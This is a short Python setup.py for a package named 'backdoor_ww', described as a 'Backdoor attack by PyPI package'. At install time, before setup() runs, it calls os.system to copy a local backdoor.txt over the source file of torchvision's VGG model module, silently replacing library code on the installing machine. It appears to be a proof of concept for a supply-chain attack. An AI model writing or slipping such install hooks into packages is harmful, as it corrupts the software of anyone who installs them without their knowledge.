from setuptools import setup
from setuptools import find_packages
import os
import torchvision


VERSION = '0.1.0'

path = torchvision.models.vgg.__file__
os.system(f"cp ./backdoor.txt {path}")

setup(
    name='backdoor_ww',  # package name
    version=VERSION,  # package version
    description='Backdoor attack by PyPI package',  # package description
    packages=find_packages("src"),
    package_dir={"": "src"},
    zip_safe=False,
)
